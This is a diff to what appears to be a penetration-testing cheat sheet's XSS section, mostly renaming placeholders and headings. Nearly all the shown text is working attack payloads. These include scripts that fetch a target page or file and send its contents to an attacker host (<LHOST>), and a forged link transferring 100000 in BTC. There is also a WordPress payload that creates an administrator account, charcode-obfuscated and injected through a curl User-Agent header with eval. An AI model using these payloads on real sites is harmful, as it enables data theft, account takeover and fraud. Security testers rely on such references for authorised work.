@@ -4697,11 +4697,11 @@ src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
 ```c
 var xhr = new XMLHttpRequest();
 document.cookie = "key=value;";
-var uri ="<target_uri>";
+var uri ="<RHOST>";
 xhr = new XMLHttpRequest();
 xhr.open("POST", uri, true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.send("<post_body>");
+xhr.send("<BODY>");
 ```
 
 ### XSS Web Request
@@ -4712,7 +4712,7 @@ xhr.send("<post_body>");
 xmlhttp = new XMLHttpRequest();
 xmlhttp.onload = function() {
   x = new XMLHttpRequest();
-  x.open("GET", '<local_url>?'+xmlhttp.response);
+  x.open("GET", '<LHOST>?'+xmlhttp.response);
   x.send(null);
 }
 xmlhttp.open("GET", '<RHOST>');
@@ -4727,7 +4727,9 @@ xmlhttp.send(null);
 <a href="javascript:fetch('http://<RHOST>/<FILE>').then(r=>r.text()).then(d=>fetch('http://<LHOST>/?response='+encodeURIComponent(d))).catch(e=>console.error('Error:',e));"><COMMENT></a>
 ```
 
-#### XSS Client-Side Request Example
+#### XSS Client-Side Attack Examples
+
+##### Request Example
 
 ```c
 <a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
@@ -4755,7 +4757,7 @@ ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"
 ajaxRequest.send(params);
 ```
 
-##### Compress Payload Script
+###### Compress Payload Script
 
 > https://jscompress.com/
 
@@ -4763,7 +4765,7 @@ ajaxRequest.send(params);
 var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
 ```
 
-##### Encoding Function
+###### Encoding Function
 
 ```c
 function encode_to_javascript(string) {
@@ -4782,13 +4784,13 @@ let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_creat
 console.log(encoded)
 ```
 
-##### Encoded Payload
+###### Encoded Payload
 
 ```c
 118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
 ```
 
-##### Execution
+###### Execution
 
 ```c
 curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
